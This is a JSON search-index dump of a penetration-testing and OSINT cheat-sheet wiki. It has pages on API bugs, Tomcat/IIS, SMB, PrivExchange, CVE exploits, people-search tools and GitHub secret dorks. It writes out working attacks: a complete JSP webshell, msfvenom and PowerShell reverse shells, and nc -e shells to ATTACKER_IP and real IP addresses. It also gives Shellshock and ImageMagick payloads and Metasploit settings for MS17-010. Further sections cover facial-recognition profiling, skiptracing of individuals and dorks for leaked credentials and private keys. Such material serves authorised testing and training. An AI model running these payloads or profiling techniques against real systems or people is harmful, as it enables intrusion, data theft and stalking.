{\u0026#34;\u0026#34;user_id\u0026#34;\u0026#34;:\u0026#34;\u0026#34;*\u0026#34;\u0026#34;} # SQL injections were very common. BOLA (IDOR) is the new epidemic of API security. # Testing for IDOR/BOLA? # Even if the ID is GUID/non-numeric value, always try to send a numeric value # (for example: \u0026#34;\u0026#34;/?user_id=111\u0026#34;\u0026#34; instead of \u0026#34;\u0026#34;user_id=inon@traceable.ai\u0026#34;\u0026#34;) # Sometimes there\u0026#39;s support for both.\u0026#34; # IDOR # IDs in the HTTP bodies / headers tend to be more vulnerable than IDs in URLs. # Never assume there’s only one way to authenticate to an API! # `/api/mobile/login` | `/api/v3/login` | `/api/magic_link`; # Web Servers(IIS, Apache) treat static resources differently when it comes to authorization. # There\u0026#39;s a good chance you can access static resources of other users. Injection # Found SSRF? use it for: - Internal port scanning - Leverage cloud services (like 169.254.169.254) - Use webhook.site to reveal IP Address \u0026amp; HTTP Library - Download a very large file (Layer 7 DoS) - Reflective SSRF? disclose local mgmt consoles # Testing Ruby on Rails App \u0026amp; found a param that contains a URL? # Developers sometimes use \u0026#34;\u0026#34;Kernel#open\u0026#34;\u0026#34; to access URLs == Game Over. # Just send a pipe as the first character and then a shell command (Shell Injection by design)\u0026#34; # Pentest for .NET apps? saw a param containing file path/name? # Developers sometimes use \u0026#34;Path.Combine(path_1,path_2)\u0026#34; to build full path. # Path.Combine has weird behavior: if param#2 is absolute path, then param#1 is ignored. # - Leverage it to control the path - # \u0026#34;Found an \u0026#34;\u0026#34;export to PDF\u0026#34;\u0026#34; feature? # There\u0026#39;s a good chance the developers use an external library to convert HTML--\u0026gt;PDF behind the scenes. # Try to inject HTML elements and cause \u0026#34;\u0026#34;Export Injection\u0026#34;\u0026#34;. Being stuck ? # Companies \u0026amp; developers tend to put more resources (including security) into the main APIs. # Always look for the most niche features that nobody uses to find interesting vulnerabilities. POST /api/profile/upload_christmas_voice_greeting # Older versions of APIs tend to be more vulnerable and they lack security protection. # Saw a call to \u0026#39;api/v3/login\u0026#39;? Check if \u0026#39;api/v1/login\u0026#39; exists as well. # Scan the .js files for strings that look like URLs(Some of them are API endpoints) # If the API has mobile clients, download old versions of the APK file # to explore old / legacy functionality and discover new API endpoints. # Pentest for REST API? Give it a chance, check if the API supports also SOAP. # Change the content-type to \u0026#34;application/xml\u0026#34;, add simple XML in the request body # and see how the API handles it. Others # Found a \u0026#34;limit\u0026#34; / \u0026#34;page\u0026#34;? (e.g: /api/news?limit=100) It might be vulnerable to Layer 7 DoS. # Try to send a long value (e.g: limit=999999999) and see what happens :) # \u0026#34;The API uses Authorization header? Forget about CSRF! # If the authentication mechanism doesn\u0026#39;t involve cookies, the API is protected against CSRF by design.\u0026#34; # Burp is really usefull # Uses the tree view to see each accessed endpoints"
},
{
	"uri": "/windows-systems/exploitation/iis/",
	"title": "IIS",
	"tags": [],
	"description": "",
	"content": " Tomcat Tips \u0026amp; Tricks # Two interfaces for tomcat /manager /host-manager# default root for IIS is C:\\inetpub\\wwwroot # Instead of using complicated relative path of the application use that one. # Upload to: C:\\inetpub\\wwwroot\\shell.jsp curl http://13.33.3.37/shell.jsp \nExploiting the classic Manager # Metasploit provides an easy to use module to upload files and get a shell use exploit/multi/http/tomcat_mgr_upload msf exploit(multi/http/tomcat_mgr_upload) \u0026gt; set rhost 192.168.1.101 msf exploit(multi/http/tomcat_mgr_upload) \u0026gt; set rport 8080 msf exploit(multi/http/tomcat_mgr_upload) \u0026gt; set httpusername tomcat msf exploit(multi/http/tomcat_mgr_upload) \u0026gt; set httppassword tomcat msf exploit(multi/http/tomcat_mgr_upload) \u0026gt; exploit# But also possible to only generate a WAR payload msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.108 LPORT=1234 -f war \u0026gt; shell.war # And then set up a listener nc -lvvp 1234 # Then deploy using the manager and browse to your shell path# JSP Webshell \u0026lt;FORM METHOD=GET ACTION=\u0026#39;index.jsp\u0026#39;\u0026gt; \u0026lt;INPUT name=\u0026#39;cmd\u0026#39; type=text\u0026gt; \u0026lt;INPUT type=submit value=\u0026#39;Run\u0026#39;\u0026gt; \u0026lt;/FORM\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;% String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); String output = \u0026#34;\u0026#34;; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } } catch(IOException e) { e.printStackTrace(); } } %\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;%=output %\u0026gt;\u0026lt;/pre\u0026gt; # Then pack it mkdir webshell cp index.jsp webshell/ cd webshell jar -cvf ../webshell.war * # Last step is deploying and browsin \nExploiting Host-Manager https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/ # You can exploit this and get a webshell or even reverse shell by uploading a WAR file # index.jsp \u0026lt;FORM METHOD=GET ACTION=\u0026#39;index.jsp\u0026#39;\u0026gt; \u0026lt;INPUT name=\u0026#39;cmd\u0026#39; type=text\u0026gt; \u0026lt;INPUT type=submit value=\u0026#39;Run\u0026#39;\u0026gt; \u0026lt;/FORM\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;% String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); String output = \u0026#34;\u0026#34;; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } } catch(IOException e) { e.printStackTrace(); } } %\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;%=output %\u0026gt;\u0026lt;/pre\u0026gt; # Then craft a WAR archive # |-- index.jsp # |-- META-INF # | |__ MANIFEST.MF # |-- WEB-INF # |__ web.xml # You may need to add a new entry in the /etc/hosts \u0026lt;IP\u0026gt; \u0026lt;Your VHOST\u0026gt; # Then deploy a SMB Server smbserver.py -smb2support \u0026lt;name\u0026gt; \u0026lt;path\u0026gt; # In the host-manager # NAME = Your VHOST # ALIASES = Your VHOST # APP base = \\\\Your-IP\\\u0026lt;name\u0026gt; # Deploy...# Get a reverse shell # You can drop a nc64.exe in your share then access it \\\\IP\\youshare\\nc64.exe -e cmd.exe ATTACKER_IP PORT # And then.. # rlwrap allows you to interface local and remote keyboard (giving arrows keyboards and history) rlwrap ncat -klvp PORT \nWebDAV Tips \u0026amp; classic webshell upload # If WebDAV is open, you can use tools like cadaver to connect cadaver \u0026lt;ip\u0026gt; dav:/\u0026gt; ls Listing collection `/\u0026#39;: succeeded.# Webdav often works with the PUT HTTP method # It means you can often upload files (for exampla, to get webshell) curl -X PUT http://10.10.10.15/tmp.txt -d @cmdasp.aspx curl -X MOVE -H \u0026#34;Destination:http://10.10.10.15/webshell.aspx\u0026#34; http://10.10.10.15/tmp.txt # Or using cadaver cp cmdasp.aspx cmdasp.txt dav:/\u0026gt; put /path/to/cmdasp.txt dav:/\u0026gt; move cmdasp.txt cmdasp.aspx \nReverse Shell # If you can execute ASPX, you can craft reverse shell payloads msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.112 LPORT=54321 -f aspx \u0026gt; shell.aspx # Then use a handler (MSF or nc for example) msf\u0026gt; use exploit/multi/handler msf\u0026gt; set payload windows/meterpreter/reverse_tcp msf\u0026gt; set LHOST xxxxxx msf\u0026gt; set LPORT xxxxxx msf\u0026gt; run CVE-2017-7269 # If you can\u0026#39;t directly upload files, you still can look for known vulnerabilities msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; options Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl): Name Current Setting Required Description ---- --------------- -------- ----------- MAXPATHLENGTH 60 yes End of physical path brute force MINPATHLENGTH 3 yes Start of physical path brute force Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.14 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path of IIS 6 web application VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 10.10.16.112 yes The listen address (an interface may be specified) LPORT 5566 yes The listen port Exploit target: Id Name -- ---- 0 Microsoft Windows Server 2003 R2 SP2 x86"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/misc/",
	"title": "MISC - Tips &amp; Tricks",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php # Professionnal profiles (like photos) can be used to search for differents # personal profiles which are easier to exploit and dig \nNewspaper # Elephind is a search engine for newspaper archives https://www.elephind.com/ \nSkype # Online source tool used to find and get information about Skype accounts https://www.skypli.com/ \nSteam # Get informations about a Steam profile https://steamid.uk/ http://vacbanned.com/engine/check \nSocialBlade # Socialblade is an online tool where you can see and analyze Youtube, Instagram, Twitch, Twitter or Dailymotion accounts https://socialblade.com/twitter/user/haaxmax \nYoutube \u0026amp; Videos # Yasiv is an online tool allowing to map links and relations between Youtube videos https://yasiv.com/ https://yasiv.com/youtube#?q=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DQWG5vDSiCHQ # Youtube comment finder https://ytcomment.kmcat.uk/ # PeteyVid is like a meta search engine for videos (specific research) # More than 70 sources https://www.peteyvid.com/ \nReaper # Reaper is a Windows GUI tool that scrapes (download) data from social media through their API # It supports several platforms : Facebook, Twitter, Reddit, Youtube, Pinterest, Tumblr # All data will be saved in a excel output format # The official website gives informations on how to set up different services https://reaper.social/ # Facebook (https://reaper.social/platforms/facebook.html) # Public and private data # The Graph API gives public access to some useful data such as the posts and comments made on public facebook pages. # Page, Group and Event administrators have access to more information such as statistics, and identifying informaton # for user’s posts, comments and reactions. If you want to access this private data you can request an access token from an administrator. \nSocial Mapper General Informations # Social Mapper is a tool that correlates profiles via facial recogniton https://github.com/SpiderLabs/social_mapper # It supports the following social networks : LinkedIn, Facebook, Twitter, GooglePlus, Instagram, VKontakte, Weibo, Douban # It can takes a variety of input # Organisation name → Searching via LinkedIn # A folder full of named images # A CSV file with names and URL\u0026#39;s to images online Getting Started # A quick run for facebook and twitter on some targets you have in an imagefolder, that you plan to manually review and don\u0026#39;t mind some false positives: python social_mapper.py -f imagefolder -i ./mytargets -m fast -fb -tw # A exhaustive run on a large company where false positives must be kept to a minimum python social_mapper.py -f company -i \u0026#34;SpiderLabs\u0026#34; -m accurate -a -t strict # A large run that needs to be split over multiple sessions due to time, the first run doing LinkedIn and Facebook, with the second resuming and # filling in Twitter, Google Plus and Instagram python social_mapper.py -f company -i \u0026#34;SpiderLabs\u0026#34; -m accurate -li -fb python social_mapper.py -f socialmapper -i ./SpiderLabs-social-mapper-linkedin-facebook.html -m accurate -tw -gp -ig # A quick run (~5min) without facial recognition to generate a CSV full of names,email addresses,profiles and photo # links from up to 1000 people pulled out of a LinkedIn company, where the email format is known to be \u0026#34;firstname.lastname\u0026#34;. python social_mapper.py -f company -i \u0026#34;SpiderLabs\u0026#34; -m accurate -li -e \u0026#34;\u0026lt;first\u0026gt;.\u0026lt;last\u0026gt;@spiderlabs.com\u0026#34; \nSkiptracer # Tool https://github.com/xillwillx/skiptracer/wiki # It uses some basic python webscraping to compile passive information on a target # Included modules will allow queries for the following : # Phone # Email # Screen names # Real names # Addresses # IP # Hostname # Breach Credentials python skiptracer.py -l phone python skiptracer.py -l email python skiptracer.py -l sn python skiptracer.py -l plate- # Phone Number (FR) https://www.118712.fr/"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/osint-spy/",
	"title": "OSINT-SPY",
	"tags": [],
	"description": "",
	"content": " General Informations # Performs OSINT scan on email/domain/ip_address/organization using OSINT-SPY. # It can be used by Data Miners, Infosec Researchers, Penetration Testers and cyber crime # investigator in order to find deep information about their target. # Perform scan on IP Address / domain / email address / BTC(bitcoin) address / device # Find out latest bitcoin block information # List out all the ciphers supported by particular website and server # Check whether a particular website is vulnerable to heartbleed or not ? # Dump all the contacts and messages from skype database # Analyze malware or malicous file remotely # Don\u0026#39;t use the linux_install.py script, trash. go venv # API keys in modules/config.py file \nUsage # Options --ssl_cipher --ssl_bleed --domain --email --ip --device --skype_db --malware --btc_block --btc_date --btc_address --carrier --stego_text --stego_find # Get information about the cipher methods available in the SSL cert python osint-spy.py --ssl_cipher google.com # Check if a target is vulnerable to heartbleed (PASSIVE ?) python osint-spy.py --ssl_bleed haax.fr # Get overall information about one domain (whois, dns, ciphers, location, and more) (PASSIVE ???) python osint-spy.py --domain domaine.fr # Get information about one email (name, social network profiles etc...) # Very basic python osint-spy.py --email haax@haax.fr # Get information about an IP address (basic infos) # Host, country name, city, organization, ISP python osint-spy.py --ip xxx.xxx.xxx.xxx \nMISC # Search for specific device on shodan python osint-spy.py --device webcam # It will find out all the contacts and message history from given skype database. # In Windows,Skype database can be found in AppData\\Roaming\\Skype\\(Your username)\\main.db # In Mac OSX , database can be found in /Users/(Your mac user anme)/Library/Support/Skype/(your skyoe username)/main.db python osint-spy.py --skype_db main.db # It will send a given piece of file to virustotal and will give you a result whether given file is malware or not. python osint-spy.py --malware abc.exe # Get information about the last bitcoint block chain python osint-spy.py --btc_block # Get information about bitcoin blockchain for a given date python osint-spy.py --btc_date 20190420 # Get information about a particular wallet python osint-spy.py --btc_address 1DST3gm6JthxhuoNKFqXrdpzPFfz1WgHpW \nSteganography # Hide text inside an image python osint-spy.py --carrier receiver.png --stego_text “this is a secret text” # Try to find text behind an image # python osint-spy.py --stego_find hidden.jpg"
},
{
	"uri": "/passcracking-hashfiles/",
	"title": "Passcracking Hash &amp; Files",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/windows-systems/privilege-escalation/privexchange/",
	"title": "PrivExchange",
	"tags": [],
	"description": "",
	"content": " Resources https://github.com/dirkjanm/PrivExchange https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ https://chryzsh.github.io/exploiting-privexchange/ # After exploitation, you won\u0026#39;t be like Domain Admin directly, so, you won\u0026#39;t be able to connect to the # DC using Domain Admins rights. # Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database # You can then use Pass the Hash attack with administrators accounts to get real access \nAclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them # BloodHound need to be running # Many options are available # Dry option is used to look for compromission without exploiting it python aclpwn.py -f user@domain.com -ft user -d domain.com -u user -p password -sp password -du neo4j -dp password -dry # Default, exploitation is started python aclpwn.py -f user@domain.com -ft user -d domain.com -u user -p password -sp password -du neo4j -dp password # You can restore previous privileges after exploitation python aclpwn.py -r restore-file \nntlmrelayx / privexchange.py # NTLM relaying is used to relay connexion and give DCSync privileges ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu # User need to have a mailbox to exploit this way # After a minute (which is the value supplied for the push notification) you can get results in ntlmrelayx python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u testuser -d testsegment.local # You can also perform the attack without getting any credentials # Using the httpattack.py file # It uses NTLM Relaying with LLMNR / NBT-NS to relay captured credentials over the network \nExchange2domain # All in One tools of privexchange # You only need to open the web server port, so no high privileges are required. # Many options available python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/tinder/",
	"title": "Tinder",
	"tags": [],
	"description": "",
	"content": "# More like Social Engineering # But it\u0026#39;s possible to fake your location # Using the android app → Android Emulator # Using the web app → Fake your brower location # Then you can go on sources (web app) and get pictures to reverse image search # You can also save them using wireshark # https://www.learnallthethings.net/osmosis # You can browe users https://www.gotinder.com/@user"
},
{
	"uri": "/network/services-enumeration/139_445_smb/",
	"title": "139/445 - SMB",
	"tags": [],
	"description": "",
	"content": " General Informations SMB1 =\u0026gt; Win2000 / XP / 2003 SMB2.0 =\u0026gt; Vista / 2008 SMB2.1 =\u0026gt; Win7 / 2008R2 SMB3.0 =\u0026gt; Win8 / 2012 SMB 3.02 =\u0026gt; Win8.1 / 2012R2 # Configuration tips # Can be usefull to configure /etc/samba/smb.conf with: client min protocol = SMB2 client max protocol = SMB3 # Then service smbd restart \nIdentification # Port 139 # Using nbtscan to identify host/domain nbtscan IP (identifier le nom/domaine) # Identity SMB2 support using metasploit use auxiliary/scanner/smb/smb2 set RHOST IP run # Discover real samba version if hidden ngrep -i -d tap0 ‘s.?a.?m.?b.?a.*[[:digit:]]’ \u0026amp; smbclient -L //IP ### Services and Resources Scanning # Base nmap nmap -v --script=xxxx -p T:139,445 \u0026lt;IP\u0026gt; # Hard nmap nmap -n -sV --version-intensity=5 -sU -sS -Pn -p T:139,445,U:137 --script=xxx \u0026lt;IP\u0026gt; # SMB Relate NSE Scripts # Try to retrieve NetBIOS and MAC nbstat # Enum smb-enum-domains smb-enum-groups smb-enum-processes smb-enum-sessions smb-os-discovery smb-server-stats smb-system-info # Attempts to retrieve useful information about files shared on SMB volumes smb-ls # Queries information managed by the Windows Master Browser smb-mbenum # Try to print something smb-print-text # Get security level information about SMB smb-security-mode # Vulns smb-vuln-conficker (dangerous, can crash target) smb-vuln-ms06-025 (Buffer overflow in RRAS) smb-vuln-ms07-029 (Buffer overflow which can crash the RPC intrface in the DNS Server) smb-vuln-ms08-067 (Buffer overflow/RCE. Dangerous, can crash the target) smb-vuln-ms10-054 (Remote Memory Corruption. Result is BSOD -\u0026gt; DANGEROUS) smb-vuln-ms10-061 (Print vulnerability. Safe and can\\\u0026#39;t crash the target) smb-vuln-ms17-010 (RCE, just checking if vulnerable) \nEnumeration # Get NetBIOS from IP nmblookup -A \u0026lt;IP\u0026gt; # Enumeration using enum4linux enum4linux -a -R 500-600,950-1150 (identifier le nom/domaine + users + shares) # Smbclient # List shares smbclient -L //IP smbclient -L \u0026lt;ip\u0026gt; # Connect smbclient \\\\\\\\x.x.x.x\\\\share smbclient -U “DOMAINNAME\\Username” \\\\\\\\IP\\\\IPC$ password # Specify username and no pass smbclient -U “” -N \\\\\\\\IP\\\\IPC$ # Nullinux for users and shares nullinux -users -quick DC1.Domain.net nullinux -all 192.168.0.0-5 nullinux -shares -U \u0026#39;Domain\\User\u0026#39; -P \u0026#39;Password1\u0026#39; 10.0.0.1,10.0.0.5 # Smbmap for domains (List share drives, drive permissions, share contents, upload/download functionality..) # Basic enumeration (password or NTLM hash) python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1 # Remote command execution python smbmap.py -u \u0026#39;apadmin\u0026#39; -p \u0026#39;asdf1234!\u0026#39; -d ACME -H 10.1.3.30 -x \u0026#39;net group \u0026#34;Domain Admins\u0026#34; /domain\u0026#39; # Non-recursive path listing python smbmap.py -H 172.16.0.24 -u Administrator -p \u0026#39;changeMe\u0026#39; -r \u0026#39;C$\\Users\u0026#39; # File content searching python smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p \u0026#39;NopSec1234!\u0026#39; -d widgetworld -F \u0026#39;[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]\u0026#39; # Drive listing python smbmap.py -H 192.168.1.24 -u Administrator -p \u0026#39;R33nisP!nckle\u0026#39; -L # Nifty Shell python smbmap.py -u jsmith -p \u0026#39;R33nisP!nckle\u0026#39; -d ABC -H 192.168.2.50 -x \u0026#39;powershell -command \u0026#34;function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=\u0026#34;\u0026#34;\u0026#34;\u0026#34;1.1.1.1\u0026#34;\u0026#34;\u0026#34;\u0026#34;; $port=\u0026#34;\u0026#34;\u0026#34;\u0026#34;4445\u0026#34;\u0026#34;\u0026#34;\u0026#34;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize ;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName=\u0026#34;\u0026#34;\u0026#34;\u0026#34;cmd.exe\u0026#34;\u0026#34;\u0026#34;\u0026#34; ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0 ;$p.Start() ;$is=$p.StandardInput ;$os=$p.StandardOutput ;Start-Sleep 1 ;$e=new-object System.Text.AsciiEncoding ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length) ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}} if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else { $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=\u0026#34;\u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34;\u0026#34;}} $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};\u0026#34;\u0026#39; # Attackers nc -l 4445 \nMS17-010 Exploitation # Using metasploit (IMPORTANT MS17_010_PSEXEC is a staged payload, means you need meterpreter !) (IMPORTANT 2, if object can\\\u0026#39;t be found, try to modify your target !) use exploit/windows/smb/ms17_010_psexec set SHARE ADMIN$ set SMBDomain ALICE set ALLOW_GUEST true set LPORT 445 set LHOST 10.11.0.179 set RHOST 10.11.1.5 set TARGET 3 (TARGET 1 = PowerShell / TARGET 2 = Native / TARGET 3 = MOF =\u0026gt; besoin du share ADMIN$) set PAYLOAD windows/shell/reverse_tcp set VERBOSE true set DBGTRACE true set EXITFUNC thread exploit -j \nTrans2open Exploitation # Samba 2.2.X are usually vulnerable to trans2open # Using metasploit use exploit/linux/samba/trans2open set VERBOSE true set PAYLOAD linux/x86/shell_reverse_tcp set RHOST IP set LPORT 443 set LHOST IP exploit -j -z \nSamba 3.4.5 Symlink Directory Traversal # You can mount the root fiilesystem to a share you can access https://www.exploit-db.com/exploits/33599 # Using metasploit https://www.exploit-db.com/exploits/33598 use auxiliary/admin/smb/samba_symlink/traversal"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/belati/",
	"title": "Belati",
	"tags": [],
	"description": "",
	"content": " General Informations # Belati is tool for Collecting Public Data \u0026amp; Public Document from Website and other service for OSINT purpose. # This tools is inspired by Foca and Datasploit for OSINT # Might need root privileges to executes all tools # Like nmap. But it works well without root (nmap won\u0026#39;t be executed) # Not totally passive as long as it does an HTTP Banner Grabbing for earch domain/subdomain found. \nUsage - Basic Commands # Display help \u0026gt; ? \u0026gt; help # Display necessary options for analysis \u0026gt; show options # You can then set your target domain \u0026gt; set domain domain.com # Start the crawling and research process \u0026gt; start \nStart - Actions # On the main domain - whois - HTTP Banner Grabbing - Subdomain enumeration (dnsdumpster, crt.sh) # Then for each subdomain - HTTP Banner Grabbing - Wappalyzing - Checking GIT/SVN repository # Then on each IP found it does nmap # If root is not set, it will skip this step (good to know) nmap -sS -A -Pn \u0026lt;IP\u0026gt; # Other steps - DNS Zone Scanning - Email harvest - Public document harvest (PDF, DOC, XLS, ODT, PPT, RTF, TXT) → Download them # Result / Report # It starts a web server on 127.0.0.1:8000"
},
{
	"uri": "/web-pentest/cve_exploits/",
	"title": "CVE &amp; Vulns exploits",
	"tags": [],
	"description": "",
	"content": " Imagick - CVE-2016-3718 - SSRF Dans un .svg push graphic-context viewbox 0 0 640 480 fill \u0026#39;url(https://example.com/image.jpg\u0026#34;|nc -l -p 7777 -e\u0026#34;/bin/sh)\u0026#39; pop graphic-context \nShellshock - CVE-2014-6271 Apache mod_cgi or any CGI information ? Could be vulnerable to shellshock # Shellshock == CVE-2014-6271 # Classic PoC curl -H \u0026#34;User-Agent: () { :; }; /bin/command\u0026#34; http://example.com/ () {:;}; /bin/cat /etc/passwd # Reverse shell () { :; }; /bin/sh -c /bin/sh -i \u0026gt;\u0026amp; /dev/tcp/139.99.169.198/51337 0\u0026gt;\u0026amp;1 \u0026amp; # Reverse Shell curl -H \u0026#34;User-Agent: () { :;};echo content-type:text/plain;echo;/bin/nc 51.75.29.235 2222 -e /bin/bash;echo;exit\u0026#34; http://vuln.com/script.cgi # Automatic tool : shellshocker.py https://github.com/liamim/shellshocker \nHeartbleed - CVE-2014-0160 # Some github repository provides functionnal PoC https://github.com/mpgn/heartbleed-PoC # Exploit using MetaSploit \u0026gt; use auxiliary/scanner/ssl/openssl_heartbleed \u0026gt; set RHOSTS 51.75.202.113:1073 \u0026gt; set RPORT 1073 \u0026gt; set TLS_VERSION 1.2 # Note - Ne pas oublier de modifier la verbosité afin de récupérer les données \u0026gt; set verbose true \u0026gt; exploit \nJava Deserialization https://artsploit.blogspot.com/2016/01/paypal-rce.html https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization https://github.com/frohoff/ysoserial # You can generate payloads to exploit unsafe Java deserialization java -jar ysoserial.jar CommonsCollections1 \u0026#39;your command\u0026#39; | base64 java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd java -jar ysoserial.jar Groovy1 calc.exe \u0026gt; groovypayload.bin nc 10.10.10.10 1099 \u0026lt; groovypayload.bin java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe \n"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/github/",
	"title": "Github",
	"tags": [],
	"description": "",
	"content": " General # Online Service used to search in many git repositories https://grep.app/ \nFinding user e-mail # Method 1 # Go for it → https://api.github.com/users/xxxxxxx/events/public # And search for “email” ------------------------ # Method 2 # Go for user repositories # Find one repo and go checks commits # Take one commit https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2 # Add .patch at the end and check for email https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2.patch# Usually, credential leaks do not occur on the company public Github # But more on developer/employees personal Github \nGitrob # Gitrob is a github scanner and crawler # Can be used to retrieve sensitive data in github repositories https://michenriksen.com/blog/gitrob-putting-the-open-source-in-osint/ https://github.com/michenriksen/gitrob # First step : Collecting all public repositories of the organization # Then it goes on organization members and all their repo # It proceeds files to gather filenames and run them through filters to detect sensitive files # It will then start a Sinatra web server locally go get github.com/michenriksen/gitrob or precompiled binaries \nGitMiner # Advanced search tool and automation in Github. # This tool aims to facilitate research by code or code # snippets on github through the site\u0026#39;s search page. # Demonstrates the fragility of trust in public repositories to store codes with sensitive information. https://github.com/UnkL4b/GitMiner # Options -m --- Specify the search module -c --- Specify the cookie for your Github -q --- Speficy search terms # Searching for wordpress configuration files with passwords python3 gitminer-v2.0.py -q \u0026#39;filename:wp-config extension:php FTP_HOST in:file \u0026#39; -m wordpress -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 -o result.txt # Looking for brasilian government files containing passwords python3 gitminer-v2.0.py --query \u0026#39;extension:php \u0026#34;root\u0026#34; in:file AND \u0026#34;gov.br\u0026#34; in:file\u0026#39; -m senhas -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 # Looking for shadow files on the etc paste python3 gitminer-v2.0.py --query \u0026#39;filename:shadow path:etc\u0026#39; -m root -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 # Searching for joomla configuration files with passwords python3 gitminer-v2.0.py --query \u0026#39;filename:configuration extension:php \u0026#34;public password\u0026#34; in:file\u0026#39; -m joomla -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 # Interesting queries | Dork | Description | | filename:.npmrc _auth | npm registry authentication data | | filename:.dockercfg auth | docker registry authentication data | | extension:pem private | private keys | | extension:ppk private | puttygen private keys | | filename:id_rsa or filename:id_dsa | private ssh keys | | extension:sql mysql dump | mysql dump | | extension:sql mysql dump password | mysql dump look for password; you can try varieties | | filename:credentials aws_access_key_id | might return false negatives with dummy values | | filename:.s3cfg | might return false negatives with dummy values | | filename:wp-config.php | wordpress config files | | filename:.htpasswd | htpasswd files | | filename:.env DB_USERNAME NOT homestead | laravel .env (CI, various ruby based frameworks too) | | filename:.env MAIL_HOST=smtp.gmail.com | gmail smtp configuration (try different smtp services too) | | filename:.git-credentials | git credentials store, add NOT username for more valid results | | PT_TOKEN language:bash | pivotaltracker tokens | | filename:.bashrc password | search for passwords, etc. in .bashrc (try with .bash_profile too) | | filename:.bashrc mailchimp | variation of above (try more variations) | | filename:.bash_profile aws | aws access and secret keys | | rds.amazonaws.com password | Amazon RDS possible credentials | | extension:json api.forecast.io | try variations, find api keys/secrets | | extension:json mongolab.com | mongolab credentials in json configs | | extension:yaml mongolab.com | mongolab credentials in yaml configs (try with yml) | | jsforce extension:js conn.login | possible salesforce credentials in nodejs projects | | SF_USERNAME salesforce | possible salesforce credentials | | filename:.tugboat NOT _tugboat | Digital 